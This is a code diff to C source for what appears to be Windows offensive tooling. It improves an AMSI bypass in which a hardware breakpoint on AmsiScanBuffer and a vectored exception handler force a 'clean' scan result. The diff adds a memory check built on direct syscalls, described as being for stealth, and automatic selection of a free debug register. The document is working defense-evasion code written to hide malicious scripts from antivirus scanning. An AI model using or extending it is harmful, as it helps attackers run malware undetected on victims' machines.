@@ -6,9 +6,16 @@
 #include "api_hashes.h"
 #include "syscalls.h"
 
-// Shared globals
 extern PVOID     g_SyscallGadget;
 extern API_TABLE g_ApiTable;
+
+// Reemplazar IsBadPtr por NtQueryVirtualMemory para mayor sigilo y precisión
+static BOOL SafeMemAccessCheck(PVOID addr, SIZE_T size) {
+    MEMORY_BASIC_INFORMATION mbi = {0};
+    NTSTATUS status = InvokeSyscall(g_ApiTable.syscalls.NtQueryVirtualMemory.ssn,
+        g_SyscallGadget, (HANDLE)-1, addr, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
+    return (status == 0 && (mbi.State == MEM_COMMIT));
+}
 
 // =============================================================================
 // VEH-BASED AMSI BYPASS WITH RE-ARMING & AUTO-REMOVAL
@@ -68,7 +75,7 @@ static LONG CALLBACK VEHCallback(_In_ PEXCEPTION_POINTERS ExceptionInfo) {
 
     // Patch result: set AMSI_RESULT_CLEAN via stack
     PDWORD pResult = (PDWORD)(pCtx->Rsp + 0x30);
-    if (pResult && !IsBadWritePtr(pResult, sizeof(DWORD))) {
+    if (pResult && SafeMemAccessCheck(pResult, sizeof(DWORD))) {
         *pResult = 0; // AMSI_RESULT_CLEAN
     }
 
@@ -78,7 +85,7 @@ static LONG CALLBACK VEHCallback(_In_ PEXCEPTION_POINTERS ExceptionInfo) {
     // Redirect RIP to after the function (find RET in AmsiScanBuffer)
     PBYTE pFunc = (PBYTE)g_VehState.TargetAddress;
     BOOL found = FALSE;
-    if (pFunc && !IsBadReadPtr(pFunc, 0x200)) {
+    if (pFunc && SafeMemAccessCheck(pFunc, 0x200)) {
         for (SIZE_T i = 0; i < 0x200; i++) {
             if (pFunc[i] == 0xC3) {
                 pCtx->Rip = (DWORD64)(pFunc + i);
@@ -131,16 +138,16 @@ static LONG CALLBACK VEHCallback(_In_ PEXCEPTION_POINTERS ExceptionInfo) {
 // INSTALL HWBP VIA SYSCALLS (NtGet/SetThreadContext)
 // =============================================================================
 
-static BOOL InstallHWBP_Syscall(PVOID targetAddress, DWORD drIndex) {
-    if (!targetAddress || drIndex > 3) return FALSE;
+static BOOL InstallHWBP_Syscall(PVOID targetAddr) {
+    if (!targetAddr) return FALSE;
 
-    g_VehState.TargetAddress = targetAddress;
-    g_VehState.DrIndex = drIndex;
+    g_VehState.TargetAddress = targetAddr;
     g_VehState.InvocationCount = 0;
-    g_VehState.IsActive = TRUE;
 
     // Register VEH handler (first in chain)
-    g_VehState.VehHandle = AddVectoredExceptionHandler(1, VEHCallback);
+    if (!g_VehState.VehHandle) {
+        g_VehState.VehHandle = AddVectoredExceptionHandler(1, VEHCallback);
+    }
     if (!g_VehState.VehHandle) return FALSE;
 
     // Use syscalls for Get/SetThreadContext to avoid telemetry
@@ -150,34 +157,35 @@ static BOOL InstallHWBP_Syscall(PVOID targetAddress, DWORD drIndex) {
 
     NTSTATUS status = InvokeSyscall(g_ApiTable.syscalls.NtGetContextThread.ssn,
         g_SyscallGadget, hThread, &ctx);
-    if (status != 0) {
-        RemoveVectoredExceptionHandler(g_VehState.VehHandle);
-        g_VehState.IsActive = FALSE;
-        return FALSE;
+    if (status != 0) return FALSE;
+
+    // Find an empty debug register to avoid clobbering existing ones
+    BOOL set = FALSE;
+    for (int i = 0; i < 4; i++) {
+        if (!(ctx.Dr7 & (1 << (i * 2)))) { // If DRi is not enabled
+            switch (i) {
+                case 0: ctx.Dr0 = (DWORD64)targetAddr; break;
+                case 1: ctx.Dr1 = (DWORD64)targetAddr; break;
+                case 2: ctx.Dr2 = (DWORD64)targetAddr; break;
+                case 3: ctx.Dr3 = (DWORD64)targetAddr; break;
+            }
+            // Enable + execute
+            ctx.Dr7 |= (1 << (i * 2));
+            ctx.Dr7 &= ~(3 << (16 + i * 4)); // Execution
+            ctx.Dr7 &= ~(3 << (18 + i * 4)); // 1 byte
+            g_VehState.DrIndex = i;
+            set = TRUE;
+            break;
+        }
     }
 
-    // Set debug register
-    switch (drIndex) {
-        case 0: ctx.Dr0 = (DWORD64)targetAddress; break;
-        case 1: ctx.Dr1 = (DWORD64)targetAddress; break;
-        case 2: ctx.Dr2 = (DWORD64)targetAddress; break;
-        case 3: ctx.Dr3 = (DWORD64)targetAddress; break;
-    }
-
-    // Enable execution breakpoint on drIndex
-    ctx.Dr7 |= (1 << (drIndex * 2));
-    ctx.Dr7 &= ~(3 << (16 + drIndex * 4)); // condition: execution (00)
-    ctx.Dr7 &= ~(3 << (18 + drIndex * 4)); // length: 1 byte (00)
+    if (!set) return FALSE;
 
     status = InvokeSyscall(g_ApiTable.syscalls.NtSetContextThread.ssn,
         g_SyscallGadget, hThread, &ctx);
-    if (status != 0) {
-        RemoveVectoredExceptionHandler(g_VehState.VehHandle);
-        g_VehState.IsActive = FALSE;
-        return FALSE;
-    }
-
-    return TRUE;
+    
+    g_VehState.IsActive = (status == 0);
+    return g_VehState.IsActive;
 }
 
 // =============================================================================
@@ -251,7 +259,7 @@ static BOOL BypassAMSI_HWBP() {
     }
     if (!pAmsiScanBuffer) return FALSE;
 
-    return InstallHWBP_Syscall(pAmsiScanBuffer, 0);
+    return InstallHWBP_Syscall(pAmsiScanBuffer);
 }
 
 #endif
